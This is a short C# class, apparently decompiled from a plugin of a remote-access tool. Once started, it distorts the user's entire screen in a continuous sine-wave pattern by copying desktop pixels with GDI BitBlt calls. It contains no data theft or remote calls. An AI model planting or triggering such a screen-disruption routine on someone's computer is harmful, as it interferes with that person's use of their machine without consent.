using System;
using System.Threading;
using System.Windows.Forms;
using Plugin.Helper.GDI;

namespace Plugin.Handler.GDI;

internal class HandleSinewaves
{
	public static CancellationTokenSource ctsStop;

	public static void Start()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			return;
		}
		ctsStop = new CancellationTokenSource();
		IntPtr desktopWindow = NativeMethods.GetDesktopWindow();
		int width = Screen.PrimaryScreen.Bounds.Width;
		int height = Screen.PrimaryScreen.Bounds.Height;
		double num = 0.0;
		while (!ctsStop.IsCancellationRequested)
		{
			IntPtr dC = NativeMethods.GetDC(IntPtr.Zero);
			for (float num2 = 0f; num2 < (float)(width + height); num2 += 0.99f)
			{
				int xSrc = (int)(Math.Sin(num) * 20.0);
				NativeMethods.BitBlt(dC, 0, (int)num2, width, 1, dC, xSrc, (int)num2, 13369376u);
				num += Math.PI / 40.0;
			}
			NativeMethods.ReleaseDC(desktopWindow, dC);
		}
	}

	public static void Stop()
	{
		if (ctsStop != null && !ctsStop.IsCancellationRequested)
		{
			ctsStop.Cancel();
		}
	}
}
